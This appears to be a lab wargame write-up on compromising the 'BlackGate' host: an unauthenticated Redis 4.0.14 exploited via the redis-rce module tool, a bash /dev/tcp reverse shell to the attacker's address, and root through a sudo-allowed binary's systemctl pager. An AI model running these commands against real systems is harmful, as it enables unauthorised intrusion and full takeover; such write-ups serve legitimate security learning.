---
title: PG_BlackGate
date: 2025-04-03
categories:
  - Wargame
tags:
  - Privilege
  - Escalation
  - Linux
  - SUID
---

## Reconnaissance
### Port Scan
I performed a port scan and found that ports `22` and `6379` were open.
```sh
$ sudo nmap -sS -sV -sC -Pn -p- -min-rate=10000 192.168.149.176
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 21:48 CDT
Nmap scan report for 192.168.149.176
Host is up (0.096s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.54 seconds
```

### Redis(6379/tcp)

The Redis server was accessible and allowed interaction without authentication.
```sh
$ redis-cli -h 192.168.149.176
192.168.149.176:6379> info
# Server
redis_version:4.0.14
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:25b410d64d050b9e
redis_mode:standalone
os:Linux 5.8.0-63-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.0
process_id:875
run_id:3b6449e937c5be649aaf8d316e1939b3567ec047
tcp_port:6379
uptime_in_seconds:27482030
uptime_in_days:318
hz:10
lru_clock:5298116
executable:/usr/local/bin/redis-server
config_file:
```

---

## Initial Access
### Redis RCE
Using [Redis-rce](https://github.com/Ridter/redis-rce?tab=readme-ov-file), I uploaded the `exp_lin.so` module and performed Remote Code Execution (RCE). Although the command output was slightly delayed, I was able to confirm that the RCE was successfully executed.
```sh
$ python3 redis-rce.py -r 192.168.149.176 -L 192.168.45.224 -P 80 -f exp_lin.so

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   


[*] Connecting to  192.168.149.176:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.149.176:6379
[*] Setting filename
[+] Accepted connection from 192.168.149.176:6379
[*] Start listening on 192.168.45.224:80
[*] Tring to run payload
[+] Accepted connection from 192.168.149.176:49908
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i
[+] Interactive shell open , use "exit" to exit...                                                                  
$ whoami                                                                                                            
$ pwd                                                                                                               
 nprudence                                                                                                          
$ id                                                                                                                
n/tmp                                                                                                               
$ whoami                                                                                                            
pnuid=1001(prudence) gid=1001(prudence) groups=1001(prudence) 
```

### Connect a Reverse shell 
I opened port `22` and attempted to establish a reverse shell connection.
```sh
$ nc -nvlp 22
listening on [any] 22 ...
```

I used the following command to establish the reverse shell connection:
```
$ /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.224/22 0>&1'
```

```sh
$ nc -nvlp 22
listening on [any] 22 ...
connect to [192.168.45.224] from (UNKNOWN) [192.168.149.176] 55558
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
prudence@blackgate:/tmp$ 
```

And, I found a `local.txt` file in `/home/prudence`.
```sh
prudence@blackgate:~$ whoami && hostname && ifconfig                                                                
whoami && hostname && ifconfig                                                                                      
prudence                                                                                                            
blackgate                                                                                                           
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                                                        
        inet 192.168.149.176  netmask 255.255.255.0  broadcast 192.168.149.255                                      
        ether 00:50:56:ab:0b:03  txqueuelen 1000  (Ethernet)                                                        
        RX packets 72460  bytes 4834902 (4.8 MB)                                                                    
        RX errors 0  dropped 38  overruns 0  frame 0                                                                
        TX packets 72148  bytes 3957664 (3.9 MB)                                                                    
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                                                  
                                                                                                                    
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                                                        
        inet 127.0.0.1  netmask 255.0.0.0                                                                           
        inet6 ::1  prefixlen 128  scopeid 0x10<host>                                                                
        loop  txqueuelen 1000  (Local Loopback)                                                                     
        RX packets 500  bytes 38144 (38.1 KB)                                                                       
        RX errors 0  dropped 0  overruns 0  frame 0                                                                 
        TX packets 500  bytes 38144 (38.1 KB)                                                                       
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                                                  
                                                                                                                    
prudence@blackgate:~$ cat /home/prudence/local.txt                                                                  
cat /home/prudence/local.txt                                                                                         
c------------------------------6
```

---

## Privilege Escalation
### Information Gathering
#### Privilges
###### sudo
The result of the `sudo -l` command showed that I could execute `/usr/local/bin/redis-status` with `root` privileges. After further investigation, I discovered that this binary was not provided by Redis but was instead a custom binary created within the server.
```sh
prudence@blackgate:~$ sudo -l
sudo -l
Matching Defaults entries for prudence on blackgate:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
```

###### Interesting file
There was a `notes.txt` file inside the `/home/prudence` directory, and its content contained the output of the `redis server` execution process.
```sh
prudence@blackgate:~$ cat notes.txt
cat notes.txt
[✔] Setup redis server
[✖] Turn on protected mode
[✔] Implementation of the redis-status
[✔] Allow remote connections to the redis server 
```

### Interesting Binary
The result of the `ls -al` command showed that the user `prudence` did not have permission to directly modify `/usr/local/bin/redis-status`.
```sh
prudence@blackgate:/tmp$ ls -al /usr/local/bin/redis-status
ls -al /usr/local/bin/redis-status
-rwxr-xr-x 1 root root 17056 Dec  6  2021 /usr/local/bin/redis-status
```

I extracted strings in the binary  with `strings` command. Therefore, I obtained the value `ClimbingParrotKickingDonkey321`, which is presumed to be the `Authorization Key` value and observed that the command `/usr/bin/systemctl status redis` was also executed.
```sh
prudence@blackgate:/tmp$ strings /usr/local/bin/redis-status
strings /usr/local/bin/redis-status
/lib64/ld-linux-x86-64.so.2
...
[*] Redis Uptime
Authorization Key: 
ClimbingParrotKickingDonkey321
/usr/bin/systemctl status redis
Wrong Authorization Key!
Incident has been reported!
...
```

After stabilizing the shell with the command below, running `/usr/local/bin/redis-status` prompts for the `Authorization Key`. After authentication, the pager for `/usr/bin/systemctl status redis` is displayed.
```sh
prudence@blackgate:/tmp$ python3 -c "import pty; pty.spawn('/bin/bash')"
python3 -c "import pty; pty.spawn('/bin/bash')"
prudence@blackgate:/tmp$ sudo redis-status
sudo redis-status
[*] Redis Uptime
Authorization Key: ClimbingParrotKickingDonkey321
ClimbingParrotKickingDonkey321
WARNING: terminal is not fully functional
-  (press RETURN)
```

It is same to execute `systemctl status redis` as `sudo`. So, I was able to [root shell spawning](https://gtfobins.github.io/gtfobins/systemctl/#sudo) in `systemctl status`.

```sh
prudence@blackgate:/tmp$ sudo redis-status
sudo redis-status
[*] Redis Uptime
Authorization Key: ClimbingParrotKickingDonkey321
ClimbingParrotKickingDonkey321
WARNING: terminal is not fully functional
-  (press RETURN)!sh
!sshh!sh
# whoami
whoami
root
```

And, I found a `proof.txt` file in `/root`.
```sh
# pwd
pwd
/root
# whoami && hostname && ifconfig
whoami && hostname && ifconfig
root
blackgate
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.149.176  netmask 255.255.255.0  broadcast 192.168.149.255
        ether 00:50:56:ab:9f:f6  txqueuelen 1000  (Ethernet)
        RX packets 950  bytes 465684 (465.6 KB)
        RX errors 0  dropped 81  overruns 0  frame 0
        TX packets 509  bytes 71712 (71.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 540  bytes 41680 (41.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 540  bytes 41680 (41.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

# cat /root/proof.txt
cat /root/proof.txt
7-----------------------------c
```